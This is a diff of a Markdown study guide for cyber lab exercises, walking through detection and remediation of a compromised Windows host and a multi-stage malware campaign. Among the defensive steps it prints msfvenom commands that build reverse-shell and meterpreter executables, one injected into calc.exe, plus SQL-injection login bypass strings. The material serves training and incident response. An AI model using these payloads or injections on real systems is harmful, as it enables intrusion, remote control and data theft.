@@ -14,13 +14,11 @@ Description: GitHub-compatible Markdown (GHM) version using supported HTML like 
 
 <details>
 
-<summary><strong>🌐 LFE 1 Bangalore - Host-Based Threat Investigation</strong></summary>
+<summary><strong>🌐 LFE 1 Bangalore - Email Dumper</strong></summary>
 
 ### 🔎 Scenario: Command and Control (C2) Detection
 
 This exercise focuses on analysing a compromised Windows host. The attacker leverages built-in Windows binaries like `certutil` and `powershell -enc` for malicious activities. The goal is to detect the infection, investigate indicators, and remove persistence and network access.
-
----
 
 ### 🧱 Step 1: Detect Suspicious Process Execution
 
@@ -153,89 +151,113 @@ Search for document files and other suspicious files across users' folders:
 Get-ChildItem -Path C:\Users -Include *.docx,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
 ```
 
----
-
 </details>
 
 ---
 
 <details>
-<summary><strong>🌋 LFE 2 Jakarta - Multi-Stage Malware & Analysis</strong></summary>
+
+<summary><strong>🌋 LFE 2 Jakarta - Killer Trojan</strong></summary>
 
 ### 🔎 Scenario: Multi-Stage Malware with Data Exfiltration
 
-- Analyse a malicious Office macro embedded in a phishing document
-- Trace execution of an obfuscated VB script delivering a reverse shell payload
-- Investigate payload generated using `msfvenom` to understand its capabilities
-- Identify encrypted files and inspect use of OpenSSL for local encryption
-- Monitor network activity and identify exfiltration using Wireshark
-- Discover and exploit an SQL injection vulnerability for unauthorised data access
+This scenario focuses on detecting and analysing a multi-stage malware campaign initiated by a phishing email with a malicious macro. The infection chain leads to PowerShell-based payloads, encrypted file exfiltration, and even web application exploitation using SQL injection. The defender’s objective is to identify all attack stages, remove persistence, and understand the tools used.
 
-### 🔎 Macro Analysis with `oletools`
+---
 
-`oletools` is a Python-based toolset for analysing Microsoft OLE2 files (e.g. Office documents). It helps detect malicious macros, extract metadata, and uncover indicators of compromise.
+### 📥 Step 1: Initial Malware Infection via Office Macro
 
-#### 🔧 Common Tools & Recursive Scans:
+Malicious document contains an embedded macro (likely `.doc` or `.docm` format). 
+
+Use **oletools** to analyse the macro contents:
+
 ```powershell
-# Recursively analyse all documents in a folder
 olevba -r C:\Path\To\Folder\*
 
-# Optional flags:
+# Optional:
 olevba -r --decode C:\Path\To\Folder\*
 olevba -r --json C:\Path\To\Folder\*
 ```
 
-#### 🔁 mraptor (manual recursion):
+Check macro static flags:
+
 ```powershell
-Get-ChildItem -Recurse -Filter *.doc* | ForEach-Object { mraptor $_.FullName }
+mraptor malicious.doc
 ```
 
-#### 📄 Other Tools:
+Extract embedded objects (payloads):
+
 ```powershell
-olemeta suspicious.doc
-olemeta --json suspicious.doc
-
-oleid suspicious.doc
-oleid --json suspicious.doc
-
-oleobj -e -d output suspicious.doc
-rtfobj -d output suspicious.rtf
+oleobj -e -d extracted malicious.doc
 ```
 
-#### 🔍 Other Tool Explanations:
-- `olemeta`: Extracts file metadata (author, creation date, etc.)
-- `oleid`: Flags suspicious indicators (e.g. presence of macros or OLE objects)
-- `oleobj`: Extracts embedded objects (e.g. a hidden .exe inside a Word file)
-- `rtfobj`: Same as `oleobj`, but for RTF documents
+If it’s an RTF file:
 
-### 💣 Payload Crafting with `msfvenom`
 ```powershell
-msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output> [-e <encoder>] [-i <iterations>] [-x <template.exe>]
+rtfobj -d extracted malicious.rtf
 ```
 
-#### 🧾 Flag Breakdown:
-- `-p`: Payload type
-- `LHOST`: Attacker IP
-- `LPORT`: Listener port
-- `-f`: Output format (e.g. exe, elf, psh)
-- `-o`: Output file
-- `-e`: Encoder
-- `-i`: Iterations
-- `-x`: Inject into another executable
+> 🧠 These tools help identify:
+> - Auto-execution macros
+> - Embedded scripts or executables
+> - Hidden payloads
 
-#### 🧰 Examples:
+---
+
+### 🧪 Step 2: Decode Obfuscated Payload (PowerShell)
+
+Extracted macros typically drop or run PowerShell commands with obfuscation like Base64:
+
 ```powershell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 -f exe -o payload.exe
-
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 -f exe -x C:\Windows\System32\calc.exe -o mal.exe -e x86/shikata_ga_nai -i 3
+powershell.exe -enc <Base64String>
 ```
 
-### 🔐 File Encryption with OpenSSL
+Decode:
+
 ```powershell
-openssl.exe enc -aes-256-cbc -base64 -in "C:\Users\cyberuser\Desktop\Files\Pass.txt" -out "C:\Users\cyberuser\Desktop\Pass.enc" -K 000001234567890ABCDEFABCDEF -iv 0
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<Base64String>"))
 ```
 
-### 📡 Wireshark Filters
+---
+
+### 💣 Step 3: Analyse the Payload (msfvenom-based)
+
+Attacker-generated reverse shell created using `msfvenom`. Example:
+
+```powershell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o agent.exe
+```
+
+Injected into another binary:
+
+```powershell
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x C:\Windows\System32\calc.exe -f exe -o payload.exe -e x86/shikata_ga_nai -i 3
+```
+
+> 🎯 Look for suspicious dropped EXEs like `agent.exe`, `payload.exe`, etc.
+
+---
+
+### 🔐 Step 4: Local File Encryption with OpenSSL
+
+Attacker encrypts local files before exfiltration using OpenSSL:
+
+```powershell
+openssl enc -aes-256-cbc -base64 -in "C:\Users\victim\Documents\secret.txt" -out "C:\Users\victim\Documents\secret.enc" -K <hex_key> -iv 0
+```
+
+---
+
+### 📡 Step 5: Monitor Network Activity (C2 & Exfil)
+
+Use tools like `netstat` to identify open reverse shells or unusual IPs:
+
+```powershell
+netstat -ano
+```
+
+If using Wireshark or PCAPs, apply relevant filters:
+
 ```wireshark
 frame.number == 1437
 frame.number >= 1434 and frame.number <= 1440
@@ -243,42 +265,87 @@ tcp.analysis.retransmission
 frame.number == 1437 and tcp.analysis.retransmission
 ```
 
-### 🔢 SQL Injection Basics
+> 🔍 Look for signs of:
+> - Reverse shell traffic
+> - Encrypted file transfer
+> - Command & Control (C2) channels
 
-**SQL injection** was found in a web-based login form hosted on the compromised environment.
+---
 
-#### Sample Inputs:
-```text
+### 🗓 Step 6: Check for Persistence (Scheduled Tasks / Registry)
+
+Check for new scheduled tasks created by the payload:
+
+```powershell
+schtasks /query /fo LIST /v
+```
+
+Or with PowerShell:
+
+```powershell
+Get-ScheduledTask | Where-Object {
+  $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
+  ($_.Actions | ForEach-Object { $_.Execute }) -match "cmd|powershell|python|.bat|wscript|schtasks"
+}
+```
+
+Check registry persistence:
+
+```powershell
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+```
+
+---
+
+### 🧬 Step 7: SQL Injection Web Exploit
+
+The attacker attempts to exploit a login form using SQLi to access a database.
+
+Try inputs like:
+
+```
 Username: ' OR 1=1;--
 Password: anything
+```
 
-Username: admin' --
-Password: anything
+Or more advanced:
 
-Username: ' OR 'a'='a';--
-Password: anything
-
-Username: " OR ""="
-Password: anything
-
-Username: ' OR 1=1 LIMIT 1;--
-Password: doesn't matter
-
-Username: admin')--
-Password: test
-
+```
 Username: ' UNION SELECT null, version();--
 Password: anything
 ```
 
-#### Underlying Query Logic:
-```sql
-SELECT * FROM users WHERE username = 'admin' AND password = 'password';
-```
+Likely back-end query:
 
-Injecting:
 ```sql
 SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '';
+```
+
+> 🧠 This can allow data access, dump credentials, or modify data.
+
+---
+
+### 🧹 Step 8: Remediation & Defence
+
+- Kill malicious processes:
+```powershell
+taskkill /F /PID <PID>
+```
+
+- Delete scheduled tasks:
+```powershell
+Unregister-ScheduledTask -TaskName "<Name>" -Confirm:$false
+```
+
+- Remove registry autoruns:
+```powershell
+reg delete HKCU\...\Run /v <ValueName> /f
+```
+
+- Block malicious IPs on the firewall:
+```powershell
+New-NetFirewallRule -DisplayName "Block C2" -Direction Outbound -RemoteAddress <IP> -Action Block
 ```
 
 </details>
